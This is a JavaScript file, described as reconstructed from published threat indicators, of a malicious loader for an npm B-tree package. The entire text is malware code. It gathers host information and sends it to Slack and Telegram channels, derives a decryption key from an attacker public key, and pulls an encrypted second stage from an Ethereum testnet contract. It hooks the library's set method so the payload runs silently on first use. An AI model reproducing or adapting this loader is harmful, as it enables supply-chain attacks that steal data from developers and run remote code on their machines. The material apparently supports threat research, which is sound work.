// reconstructed from public Checkmarx Zero IOCs — indexed-btree runtime loader
const crypto = require('crypto');
const https = require('https');
const os = require('os');

const SEPOLIA_RPC = 'https://eth-sepolia.g.alchemy.com/v2/D2-TbkB2m05WXSnSDOCDI';
const FALLBACK_RPC = 'https://sepolia.infura.io/v3/dc7257d09fab42eca2c354c32fec1938';
const CONTRACT = '0xE390863Dac96a7118C71227C2b099B50cF602D31';
const ATTACKER_PUB = 'bad013df6eec5d686f4cc8551e0a5c87a0135164bdd1dafb1c75141d1b526702';

function recon() {
  return { arch: os.arch(), host: os.hostname(), cpu: os.cpus().length,
           mem: os.totalmem(), up: os.uptime() };
}

function beacon(data) {
  // dual exfil: Slack + Telegram
  postSlack('xoxb-11307403103236-[REDACTED-revoked-see-Checkmarx]', 'C0B8XPGCKQS', data);
  postTelegram('8961878831:AA[REDACTED-revoked-see-Checkmarx]', '-1003952553968', data);
}

async function fetchStage() {
  const ecdh = crypto.createECDH('x25519');   // some builds: generate x25519 keypair
  ecdh.generateKeys();
  const shared = ecdh.computeSecret(Buffer.from(ATTACKER_PUB, 'hex'));
  const aesKey = crypto.createHash('sha256').update(shared).digest();
  const blobs = await readContract(SEPOLIA_RPC, CONTRACT);       // two ciphertext blobs
  const d = crypto.createDecipheriv('aes-256-gcm', aesKey, blobs.iv);
  return Buffer.concat([d.update(Buffer.concat(blobs.parts)), d.final()]);
}

// payload wired into the core runtime method — no install hook
const _origSet = BTree.prototype.set;
BTree.prototype.set = function (k, v) {
  try { beacon(recon()); fetchStage().then(runStage).catch(() => {}); } catch (e) {}
  BTree.prototype.set = _origSet;   // fire once
  return _origSet.call(this, k, v);
};
